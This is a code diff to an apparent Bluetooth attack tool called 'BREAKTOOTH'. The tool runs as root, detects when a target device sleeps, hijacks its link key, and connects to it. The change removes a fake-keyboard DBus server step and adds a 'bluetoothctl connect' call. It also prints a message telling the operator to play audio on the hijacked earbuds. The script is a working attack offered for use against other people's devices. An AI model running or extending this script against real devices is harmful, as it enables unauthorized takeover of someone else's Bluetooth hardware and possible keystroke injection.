@@ -2,6 +2,7 @@
 
 import os
 import sys
+import subprocess
 import time
 import tools.emulator.rules.constants as consts
 from gi.repository import GLib
@@ -52,33 +53,28 @@ if len(sys.argv) < 2:
 try:
     if not os.geteuid() == 0:
         sys.exit("Only root can run this script")
-    
+
     print(BREAKTOOTH_LOGO)
-    
+
     bt_addr = sys.argv[1]
     print_status(f"Target Bluetooth Address: {Fore.CYAN}{bt_addr}{Style.RESET_ALL}")
-    
+
     print_status("Initiating sleep detection...")
     sleep_detector(bt_addr=bt_addr)
-    
+
     print_status("Attempting bluetooth link key hijacking...", "info")
     # hijack bluetooth link key
     bt_sock = BTSocket(proto=consts.BTPROTO_L2CAP, bt_addr=bt_addr)
     bt_sock.set_security_level(level=consts.BT_SECURITY_HIGH)
     bt_sock.key_hijacking()
     print_status("Link key hijacking successful!", "success")
-    
-    # sleep
-    print_status("Waiting for 5 seconds...", "info")
+
+    print_status("Connecting to buds in 5 sec...", "success")
     time.sleep(5)
-    
-    # boot dbus server as bluetooth keyboard
-    print_status("Starting DBus server as bluetooth keyboard...", "info")
-    DBusGMainLoop(set_as_default=True)
-    myservice = KbServer(mac_address=sys.argv[1])
-    loop = GLib.MainLoop()
-    print_status("Server started successfully. Running main loop...", "success")
-    loop.run()
+    print_status("Connecting to buds...", "info")
+    subprocess.run(["bluetoothctl", "connect", bt_addr])
+    print_status("\nYou have hijacked the connect to the buds!", "success")
+    print_status("Run `paplay /usr/share/sounds/alsa/Front_Center.wav` from user pi", "info")
 except KeyboardInterrupt:
     print_status("\nOperation cancelled by user", "error")
     sys.exit()
